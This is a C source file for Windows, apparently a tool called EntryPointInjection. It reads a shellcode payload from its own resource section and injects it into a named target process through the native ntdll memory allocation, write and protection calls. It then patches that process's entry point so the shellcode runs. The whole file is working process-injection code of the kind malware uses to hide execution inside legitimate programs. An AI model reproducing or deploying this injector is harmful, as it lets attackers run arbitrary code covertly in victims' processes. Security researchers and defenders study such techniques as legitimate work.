#include <Windows.h>
#include <stdio.h>
#include "structs.h"
#include "common.h"
#include "resource.h"

NT_API g_nt = { 0 };

BOOL initNtApi() {
	g_nt.pNtQueryInformationProcess	= (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	g_nt.pNtWriteVirtualMemory		= (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	g_nt.pNtQuerySystemInformation	= (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	g_nt.pNtReadVirtualMemory		= (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	g_nt.pNtAllocateVirtualMemory	= (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	g_nt.pNtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");

	if (g_nt.pNtQueryInformationProcess != NULL && g_nt.pNtWriteVirtualMemory != NULL && g_nt.pNtQuerySystemInformation != NULL && g_nt.pNtReadVirtualMemory != NULL && g_nt.pNtAllocateVirtualMemory != NULL && g_nt.pNtProtectVirtualMemory != NULL)
		return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
	DWORD						dwOldProtect		= NULL;
	DWORD						dwProcessId			= NULL;
	HANDLE						hProcess			= NULL;
	PVOID						pShellcodeAddress	= NULL;
	SIZE_T						sBytesWritten		= NULL;
	NTSTATUS					STATUS				= 0x00;

	if (argc < 2) {
		printf("[!] Please specify target process\n[i] Usage: EntryPointInjection.exe notepad.exe\n");
		return -1;
	}

	LPCWSTR szProcessName = argv[1];

	if (!initNtApi()) {
		printf("[!] initNtApi failed\n");
		return -1;
	}

	printf("[i] Searching for %ws ...\n", szProcessName);
	if (!GetProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		printf("[!] GetProcessHandle failed\n");
		return -1;
	}
	printf("[+] Success, got handle to %ws with PID %d\n", szProcessName, dwProcessId);

	// Getting the payload from .rsrc and placing it in a buffer
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	PVOID pShellcodeRsrcAddress = LockResource(hGlobal);
	SIZE_T sShellcodeSize = SizeofResource(NULL, hRsrc);

	PVOID pShellcodeBuffer = HeapAlloc(GetProcessHeap(), 0, sShellcodeSize);
	memcpy(pShellcodeBuffer, pShellcodeRsrcAddress, sShellcodeSize);

	printf("[i] Allocating space for our shellcode ...\n");
	if ((STATUS = g_nt.pNtAllocateVirtualMemory(hProcess, &pShellcodeAddress, 0, &sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00) {
		printf("[!] NtAllocateVirtualMemory failed with error: 0x%0.8X\n", STATUS);
		return -1;
	}
	printf("[+] Allocted space for shellcode at: 0x%p\n", pShellcodeAddress);

	printf("[i] Writing our shellcode ...\n");
	if ((STATUS = g_nt.pNtWriteVirtualMemory(hProcess, pShellcodeAddress, pShellcodeBuffer, sShellcodeSize, &sBytesWritten)) != 0x00) {
		printf("[!] NtWriteVirtualMemory failed with error: 0x%0.8X\n", STATUS);
		return -1;
	}
	printf("[+] Successfully wrote shellcode to: 0x%p\n", pShellcodeAddress);

	HeapFree(GetProcessHeap(), 0, pShellcodeBuffer);

	printf("[i] Changing memory protection to RX ...\n");
	if ((STATUS = g_nt.pNtProtectVirtualMemory(hProcess, &pShellcodeAddress, &sShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect)) != 0x00) {
		printf("[!] NtProtectVirtualMemory failed with error: 0x%0.8X\n", STATUS);
		return -1;
	}
	printf("[+] Successfully changed memory protection\n");

	PatchEntryPoint(MODULE, hProcess, pShellcodeAddress);

	CloseHandle(hProcess);

	return 0;
}
